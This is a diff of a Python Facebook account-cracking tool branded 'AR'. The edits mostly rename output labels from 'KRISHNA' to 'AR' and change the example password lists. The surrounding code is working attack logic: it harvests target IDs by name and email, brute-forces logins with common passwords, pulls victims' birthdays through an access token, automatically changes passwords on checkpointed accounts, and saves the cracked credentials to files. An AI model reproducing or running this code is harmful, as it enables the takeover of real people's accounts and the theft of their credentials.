@@ -129,7 +129,7 @@ def clear():
 ### Logo
 def banner():
         os.system("clear")
-        os.system('echo -e "\n\x1b[1;91m      _       __    _  \n\x1b[1;91m     / \     [  |  (_) \n\x1b[1;92m    / _ \     | |  __ \n\x1b[1;92m   / ___ \    | | [  | \n\x1b[1;91m _/ /   \ \_  | |  | | \n\x1b[1;93m_/ /   \ \_  | |  | | \n\x1b[1;93m|____| |____|[___][___] \n\x1b[1;97m------------------------------------------------\n \n \x1b[1;93m(*)\x1b[1;95m Auther    : Ali Raza  \n \x1b[1;93m(*)\x1b[1;93m Wp   :     03047269778\n \x1b[1;93m(*)\x1b[1;95m Tool Name  :     AR\n \x1b[1;93m(*)\x1b[1;91m STATUS    : PAID\n\x1b[1;97m------------------------------------------------" | lolcat')
+        os.system('echo -e "\n\x1b[1;91m      _       __    _  \n\x1b[1;91m     / \     [  |  (_) \n\x1b[1;92m    / _ \     | |  __ \n\x1b[1;92m   / ___ \    | | [  | \n\x1b[1;91m _/ /   \ \_  | |  | | \n\x1b[1;93m_/ /   \ \_  | |  | | \n\x1b[1;93m|____| |____|[___][___] \n\x1b[1;97m------------------------------------------------\n \n \x1b[1;93m(*)\x1b[1;95m Auther    : Ali Raza  \n \x1b[1;93m(*)\x1b[1;93m Wp   :     03047269778\n \x1b[1;93m(*)\x1b[1;95m Tool Name  :    AR\n \x1b[1;93m(*)\x1b[1;91m STATUS    : PAID\n\x1b[1;97m------------------------------------------------" | lolcat')
         print("") 
         
 
@@ -221,7 +221,7 @@ def menu():
     pm = _cici_azimvau_('%s [%s>_%s] %sCHOOSE : %s'%(H,P,H,K,H))
     print('%s '%(O))
     if pm in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(P,M,P,M));menu()
-    elif pm in ['1','01','001','a']:publik(token)
+    elif pm in ['1','01','001','a']:public(token)
     elif pm in ['2','02','002','b']:pengikut(token)
     elif pm in ['3','03','003','c']:cek_dev();followers(_salsabila_)
     elif pm in ['4','04','004','d']:cek_dev();dump_name(_salsabila_)
@@ -655,7 +655,7 @@ def file():
 		
 
 def dump_email():
-    print("%s [%s•%s] %sEXAMPLE : ayeshakhan "%(H,P,H,K));_query_ = _cici_azimvau_("%s [%s•%s] %sENTER NAME : "%(H,P,H,K)).lower()
+    print("%s [%s•%s] %sEXAMPLE : aliraza "%(H,P,H,K));_query_ = _cici_azimvau_("%s [%s•%s] %sENTER NAME : "%(H,P,H,K)).lower()
     if len(_query_) < 3:jalan('%s [%s!%s] %sNAME MUST BE MORE THAN 2 DIGITS'%(M,P,M,P));time.sleep(2);menu()
     print("%s [%s•%s] %sEXAMPLE : %sgmail.com"%(H,P,H,K,H));_domain_ = _cici_azimvau_("%s [%s•%s] %sENTER DOMAIN : "%(H,P,H,K)).lower()
     if '@' in _domain_:_domain_ = _domain_.split('@')[1]
@@ -1081,7 +1081,7 @@ def auto_ganti_pass(_piye_):
         if _gimana_ in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
         elif _gimana_ in ['1','01','001','y','Y']:
             open('auto_ganti.txt','w').write('Yes');_newpass_ = _cici_azimvau_('%s [%s•%s] %sENTER ONE TAP PASSWORD : '%(H,P,H,K))
-            if len(_newpass_)<6:print('%s [%s!%s] %sSandi Minimal 6 Karakter'%(M,P,M,P));time.sleep(3);menu()
+            if len(_newpass_)<6:print('%s [%s!%s] %sMinimum 6 character'%(M,P,M,P));time.sleep(3);menu()
             else:open('_new_pass_.txt','w').write(_newpass_)
             if _piye_ == 'Yes':open('muncul_opsi.txt','w').write('Yes')
             elif _piye_ == 'No':open('muncul_opsi.txt','w').write('No')
@@ -1095,7 +1095,7 @@ def change_pass(user,_req_ses_,_response_,link_2):
     files_ok = "OK/%s.txt"%(tanggal)
     try:_new_pass_ = open('_new_pass_.txt','r').read()
     except:_new_pass_ = 'azimvau-_'
-    _password_ = ''.join(_new_pass_);_result_ok_ = "\r %s[%sKachi-OK%s] %s • %s%s%s          "%(H,P,H,user,_password_,tahun(user),P);_button_dev_ = ["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
+    _password_ = ''.join(_new_pass_);_result_ok_ = "\r %s[%sAR-OK%s] %s • %s%s%s          "%(H,P,H,user,_password_,tahun(user),P);_button_dev_ = ["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
     for _azimvau_ in _response_("input"):
         if _azimvau_.get("name") in _button_dev_:data_change_1.update({_azimvau_.get("name"):_azimvau_.get("value")})
     _ganti_pass_ = _req_ses_.post(host+link_2.get("action"),data=data_change_1).text;_result_pass_ = par(_ganti_pass_,"html.parser");_link_3_ = _result_pass_.find("form",{"method":"post"});_button_dev__2_ = ["submit[Next]","nh","fb_dtsg","jazoest"]
@@ -1209,7 +1209,7 @@ class crack:
                         try:self.fl.append({"id":i.split("•")[0]})
                         except:continue
                 except Exception as e:print(("   %s"%e));continue
-                print('%s [%s•%s] %sEXAMPLE : %sAmerica,123456,102030'%(H,P,H,K,H));self.pwlist();break
+                print('%s [%s•%s] %sEXAMPLE : %spakistan,123456,786786'%(H,P,H,K,H));self.pwlist();break
             elif _pilih_sandi_ in ['d','D','1','01','001']:
                 try:
                     while True:
@@ -1273,19 +1273,19 @@ class crack:
                 elif 'methode_mobile_v2' in metode:log = log_mobile_2(fl.get("id"),i)
                 else:log = log_mbasic_1(fl.get("id"),i)
                 if log.get("status")=="cp":
-                    files_cp = "KRISHNA-CP/%s.txt"%(tanggal)
+                    files_cp = "AR-CP/%s.txt"%(tanggal)
                     if fl.get("id") in files_cp:pass
                     else:
                         try:ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name&access_token=" + _azimvau_dapunta_("token.txt","r").read());tt = _js_lo_(ke.text);ttl = tt["birthday"];m,d,y = ttl.split("/");m = bulan_ttl[m];ttll = (' • %s %s %s'%(d,m,y))
                         except:ttll = (''%())
-                        h_cp = "\r %s[%sAR-CP%s] %s • %s%s%s          "%(K,P,K,fl.get("id"),i,ttll,tahun(fl.get("id")));cek_opsi(fl.get("id"),i,h_cp)
+                        h_cp = "\r %s[%sARシ︎-CP%s] %s • %s%s%s          "%(K,P,K,fl.get("id"),i,ttll,tahun(fl.get("id")));cek_opsi(fl.get("id"),i,h_cp)
                         self.cp.append("%s•%s"%(fl.get("id"),i));_azimvau_dapunta_(files_cp,"a+").write("%s•%s%s\n"%(fl.get("id"),i,ttll.replace(' ','')));break
                 elif log.get("status")=="ok":
                     files_ok = "AR-OK/%s.txt"%(tanggal)
                     if fl.get("id") in files_ok:pass
                     else:
-                        if 'methode_mbasic_v1' in metode or 'methode_mbasic_v2' in metode or 'methode_mobile_v1' in metode or 'methode_mobile_v2' in metode:h_ok = "\r %s[%sKRISHNA-OK%s] %s • %s%s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P);cek_apk(h_ok,cvt_cookies(log.get("cookies")))
-                        else:print("\r %s[%sAR-OK%s] %s • %s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
+                        if 'methode_mbasic_v1' in metode or 'methode_mbasic_v2' in metode or 'methode_mobile_v1' in metode or 'methode_mobile_v2' in metode:h_ok = "\r %s[%sAR-OK%s] %s • %s%s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P);cek_apk(h_ok,cvt_cookies(log.get("cookies")))
+                        else:print("\r %s[%sARシ︎-OK%s] %s • %s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                         self.ada.append("%s•%s"%(fl.get("id"),i));_azimvau_dapunta_(files_ok,"a+").write("%s•%s\n"%(fl.get("id"),i));break
                 else:continue
             self.ko+=1
@@ -1324,7 +1324,7 @@ def result():
             if files == "":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));result()
             try:
                 ppp = _azimvau_dapunta_("AR-OK/%s"%(files)).read().splitlines()
-                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sKRISHNA-OK%s] %s'%(H,P,H,yyy))
+                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sAR-OK%s] %s'%(H,P,H,yyy))
                 del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "");print('\n%s [%s•%s] %sTOTAL CRACK RESULT DATE %s IS %s ACCOUNT'%(H,P,H,K,del1,len(ppp)))
             except:print('%s [%s NO RESULTS FOUND %s]'%(M,P,M))
         except (KeyError,IOError):print('%s [%s NO RESULTS FOUND %s]'%(M,P,M))
@@ -1336,7 +1336,7 @@ def result():
             if files == "":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));result()
             try:
                 ppp = _azimvau_dapunta_("AR-CP/%s"%(files)).read().splitlines()
-                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sKRISHNA-CP%s] %s'%(K,P,K,yyy))
+                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sAR-CP%s] %s'%(K,P,K,yyy))
                 del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "");print('\n%s [%s•%s] %sTOTAL CRACK RESULT DATE %s IS %s ACCOUNT'%(H,P,H,P,del1,len(ppp)))
             except:print('%s [%s NO RESULTS FOUND %s]'%(P,M,M))
         except:print('%s [%s NO RESULTS FOUND %s]'%(P,M,P))
@@ -1400,8 +1400,8 @@ def started():
     print("")
     print("     %s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•"%(H,M,B,K,U,O,K,H,M,B,K,U,O,K,H,M,B,K))
     print('%s [%s•%s] %sCRACKS IN PROGRESS...'%(H,M,H,H))
-    print('%s [%s•%s] %s[%sOK%s] IDS SAVED IN >> %sKRISHNA-OK/%s.txt'%(H,B,H,O,H,O,H,tanggal))
-    print('%s [%s•%s] %s[%sCP%s] IDS SAVED IN >> %sKRISHNA-CP/%s.txt'%(H,K,H,O,M,O,M,tanggal))
+    print('%s [%s•%s] %s[%sOK%s] IDS SAVED IN >> %sAR-OK/%s.txt'%(H,B,H,O,H,O,H,tanggal))
+    print('%s [%s•%s] %s[%sCP%s] IDS SAVED IN >> %sAR-CP/%s.txt'%(H,K,H,O,M,O,M,tanggal))
     psb('%s [%s•%s] %sON FLIGHT MODE FOR [5 SEC] EVERY 5 MINUTES\n'%(H,P,H,B))
 
 
